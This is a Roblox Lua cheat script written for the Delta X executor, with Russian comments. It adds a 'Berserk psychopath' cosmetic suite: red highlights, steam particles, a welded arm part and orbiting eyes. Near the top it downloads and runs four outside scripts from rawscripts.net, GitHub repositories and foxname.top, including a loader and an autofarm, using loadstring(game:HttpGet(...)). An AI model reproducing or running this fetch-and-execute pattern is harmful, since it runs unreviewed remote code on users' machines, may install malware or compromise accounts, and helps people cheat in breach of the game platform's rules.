-- =====================================================================
-- ULTIMATE BERSERK & PSYCHOPATH MASTER SUITE: Final Build
-- Target Executor: Delta X / Custom Environments
-- =====================================================================

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer

-- 1. Загрузка базовых читов и скрипта страшных анимаций
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Scary-animation-76752", true))()
    end)
end)

task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/VW-Add/main/nightsintheforest.lua", true))()
    end)
end)

task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://foxname.top/loader"))()
        loadstring(game:HttpGet("https://foxname.top/autofarm"))()
    end)
end)

task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/wefwef127382/99daysloader.github.io/refs/heads/main/ringta.lua"))()
    end)
end)

-- 2. Модуль визуального террора, левитации и демонической экипировки
local function applyMasterSuite()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local rootPart = character:WaitForChild("HumanoidRootPart")
    local humanoid = character:WaitForChild("Humanoid")
    local head = character:WaitForChild("Head")
    local rightArm = character:FindFirstChild("Right Arm") or character:FindFirstChild("RightHand")

    -- Зловещая ухмылка на лице
    local face = head:FindFirstChildOfClass("Decal")
    if face then
        face.Texture = "rbxassetid://70747551"
    end

    -- Кроваво-красная подсветка психопата
    if not character:FindFirstChild("PsychopathHighlight") then
        local highlight = Instance.new("Highlight")
        highlight.Name = "PsychopathHighlight"
        highlight.Adornee = character
        highlight.FillColor = Color3.fromRGB(100, 0, 0)
        highlight.OutlineColor = Color3.fromRGB(255, 0, 0)
        highlight.FillTransparency = 0.35
        highlight.OutlineTransparency = 0
        highlight.Parent = character
    end

    -- Паровой шлейф титана
    local attachment = rootPart:FindFirstChild("TitanAttachment") or Instance.new("Attachment", rootPart)
    attachment.Name = "TitanAttachment"
    
    local particles = attachment:FindFirstChild("TitanSteam") or Instance.new("ParticleEmitter")
    particles.Name = "TitanSteam"
    particles.Color = ColorSequence.new(Color3.fromRGB(240, 240, 240), Color3.fromRGB(160, 160, 160))
    particles.Size = NumberSequence.new(1.5, 4.0)
    particles.Transparency = NumberSequence.new(0.3, 1.0)
    particles.Lifetime = NumberRange.new(0.6, 1.2)
    particles.Rate = 50
    particles.Speed = NumberRange.new(6, 14)
    particles.Parent = attachment

    -- Правая рука Гайца (Проклятая демоническая пушка/протез)
    if rightArm and not character:FindFirstChild("GutsArmManifest") then
        local gutsArmPart = Instance.new("Part")
        gutsArmPart.Name = "GutsArmManifest"
        gutsArmPart.Size = Vector3.new(0.7, 1.4, 0.7)
        gutsArmPart.BrickColor = BrickColor.new("Really black")
        gutsArmPart.Material = Enum.Material.Neon
        gutsArmPart.CanCollide = false
        gutsArmPart.Transparency = 0.15

        local wConstraint = Instance.new("WeldConstraint")
        wConstraint.Part0 = rightArm
        wConstraint.Part1 = gutsArmPart
        wConstraint.Parent = gutsArmPart
        
        gutsArmPart.CFrame = rightArm.CFrame * CFrame.new(0, -0.2, 0)
        gutsArmPart.Parent = character
    end

    -- Голографический терминал
    local holoScreen = character:FindFirstChild("HologramTerminal")
    if not holoScreen then
        holoScreen = Instance.new("Part")
        holoScreen.Name = "HologramTerminal"
        holoScreen.Size = Vector3.new(2.5, 1.5, 0.1)
        holoScreen.BrickColor = BrickColor.new("Bright red")
        holoScreen.Material = Enum.Material.Neon
        holoScreen.CanCollide = false
        holoScreen.Transparency = 0.3

        local wConstraint = Instance.new("WeldConstraint")
        wConstraint.Part0 = rootPart
        wConstraint.Part1 = holoScreen
        wConstraint.Parent = holoScreen
        
        holoScreen.CFrame = rootPart.CFrame * CFrame.new(0, 1, -2)
        holoScreen.Parent = character
    end

    -- Аура с живыми глазами-наблюдателями
    local eyesFolder = character:FindFirstChild("AuraEyesFolder") or Instance.new("Folder", character)
    eyesFolder.Name = "AuraEyesFolder"
    eyesFolder:ClearAllChildren()

    local eyeParts = {}
    for i = 1, 8 do
        local eye = Instance.new("Part")
        eye.Name = "PsychopathEye_" .. i
        eye.Size = Vector3.new(0.35, 0.35, 0.35)
        eye.Shape = Enum.PartType.Ball
        eye.Material = Enum.Material.Neon
        eye.BrickColor = BrickColor.new("Bright red")
        eye.CanCollide = false
        eye.Parent = eyesFolder
        table.insert(eyeParts, eye)
    end

    -- Рендер-цикл: Истинная левитация и динамика
    local connection
    connection = RunService.RenderStepped:Connect(function()
        if not character or not humanoid or humanoid.Health <= 0 then
            if connection then connection:Disconnect() end
            if holoScreen then holoScreen:Destroy() end
            if eyesFolder then eyesFolder:Destroy() end
            return
        end

        local timeVal = tick()
        
        if rootPart then
            -- Плавная левитация над поверхностью
            rootPart.Velocity = Vector3.new(0, 0, 0)
            
            -- Мерцание голограммы
            if holoScreen then
                holoScreen.Transparency = 0.2 + math.sin(timeVal * 15) * 0.1
            end

            -- Орбитальное движение живых глаз
            for index, eyePart in ipairs(eyeParts) do
                local angle = (timeVal * 3.5) + (index * (math.pi / 4))
                local radius = 4.0 + math.sin(timeVal * 2 + index) * 0.6
                local heightOffset = math.sin(timeVal * 5 + index) * 1.8
                
                local offsetPos = Vector3.new(math.cos(angle) * radius, heightOffset, math.sin(angle) * radius)
                eyePart.CFrame = rootPart.CFrame + offsetPos
            end
        end
    end)
end

-- Хук автоматического применения при респауне
LocalPlayer.CharacterAdded:Connect(function()
    task.wait(1)
    applyMasterSuite()
end)

if LocalPlayer.Character then
    task.spawn(applyMasterSuite)
end

print("[SYSTEM] Ultimate Berserk Master Suite successfully deployed.")
